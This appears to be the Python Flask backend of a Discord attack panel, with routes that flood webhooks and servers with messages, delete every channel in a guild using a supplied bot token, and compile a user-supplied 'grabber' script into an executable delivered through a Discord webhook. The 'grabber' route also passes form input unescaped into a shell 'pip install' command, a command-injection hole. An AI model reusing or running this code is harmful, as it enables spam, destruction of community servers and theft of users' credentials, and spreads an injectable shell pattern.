import subprocess, threading, traceback, shutil, asyncio, string, random, time, sys, os
import discordWebhook, discordBot
from flask import Flask, request, make_response, redirect, url_for, session, render_template, jsonify
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/getDiscordWebhookLog', methods=["GET"])
def getDiscordWebhookLog():
    if request.args.get("id") in discordWebhook.logs:
        return render_template('getLog.html', log=discordWebhook.logs[request.args.get("id")])
    else:
        return render_template('getLog.html', log="Not found"), 404 

@app.route('/stopDiscordWebhook', methods=["GET"])
def stopDiscordWebhook():
    discordWebhook.stops.append(request.args.get("id"))
    return redirect('webhookNuke') 

@app.route('/webhookNuke', methods=["GET", "POST"])
def webhookNuke():
    if request.method == "POST":
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        
        webhookUrl = request.form["webhookUrl"]
        latency = int(request.form["latency"])
        message = request.form["message"]
        
        discord = discordWebhook.DiscordWebhook(webhookUrl)
        nukeThread = threading.Thread(target=discord.nuke, args=(logId, latency, message))
        nukeThread.start()
        
        return render_template('webhookNuke.html', logId=logId)
    return render_template('webhookNuke.html')

@app.route('/getDiscordBotLog', methods=["GET"])
def getDiscordBotLog():
    if request.args.get("id") in discordBot.logs:
        return render_template('getLog.html', log=discordBot.logs[request.args.get("id")])
    else:
        return render_template('getLog.html', log="Not found"), 404

@app.route('/stopDiscordBot', methods=["GET"])
def stopDiscordBot():
    discordBot.stops.append(request.args.get("id"))
    return redirect('botNuke')

@app.route('/botNuke', methods=["GET", "POST"])
async def botNuke():
    if request.method == "POST":
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        
        token = request.form["token"]
        guildId = request.form["guildId"]
        channelName = request.form["channelName"]
        latency = int(request.form["latency"])
        message = request.form["message"]
        
        discord = discordBot.DiscordBot(token)
        botThread = threading.Thread(target=discord.runBot, daemon=True)
        botThread.start()
        time.sleep(5)
        asyncio.run_coroutine_threadsafe(discord.nuke(logId, latency, message, guildId, channelName), discord.loop)
        
        return render_template('botNuke.html', logId=logId)
    return render_template('botNuke.html')

@app.route('/allChannelDelete', methods=["GET", "POST"])
def allChannelDelete():
    if request.method == "POST":
        token = request.form["token"]
        guildId = request.form["guildId"]
        createOne = request.form["createOne"]
        
        discord = discordBot.DiscordBot(token)
        botThread = threading.Thread(target=discord.runBot, daemon=True)
        botThread.start()
        time.sleep(5)
        asyncio.run_coroutine_threadsafe(discord.allChannelDelete(guildId, createOne), discord.loop)
    return render_template('allChannelDelete.html')

@app.route('/grabber', methods=["GET", "POST"])
def grabberGenerator():
    if request.method == "POST":
        try:
            randomStr = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
            webhookUrl = request.form["webhookUrl"]
            libraries = request.form["libraries"].split(",")
            script = request.form["script"]
            
            discord = discordWebhook.DiscordWebhook(webhookUrl=webhookUrl)
            os.makedirs("temp", exist_ok=True)
            setupScript = ["from cx_Freeze import setup, Executable",
                            "setup(",
                            "   name=\"nuker\",",
                            "   version=\"1.0\",",
                            "   description=\"\",",
                            "   options={'build_exe': {'packages': "+str(libraries)+", \"build_exe\": \"temp/nuker\"}},",
                            "   executables=[Executable(\"temp/"+randomStr+".py\")]",
                            ")"]
            with open(f"temp/{randomStr}.py", mode="w") as f:
                f.write("WEBHOOK_URL=\""+webhookUrl+"\"\n"+script)
            with open(f"temp/{randomStr}-setup.py", mode="w") as f:
                f.write("\n".join(setupScript))
            
            subprocess.run("pip install "+" ".join(libraries), shell=True)
            subprocess.run(f"{sys.executable} temp/{randomStr}-setup.py build", shell=True)
            shutil.make_archive('nuker', 'zip', root_dir='temp/nuker')
            response = discord.sendFile("nuker.zip")
            shutil.rmtree('temp')
            os.remove("nuker.zip")
            
            if response.status_code == 204:
                return render_template('grabber.html', success="成功しました")
            else:
                return render_template('grabber.html', error="ファイル送信中にエラーが発生しました")
        except:
            shutil.rmtree('temp')
            return render_template('grabber.html', error="例外が発生しました<br><br>"+"<br>".join(traceback.format_exc().split("\n")))
    return render_template('grabber.html')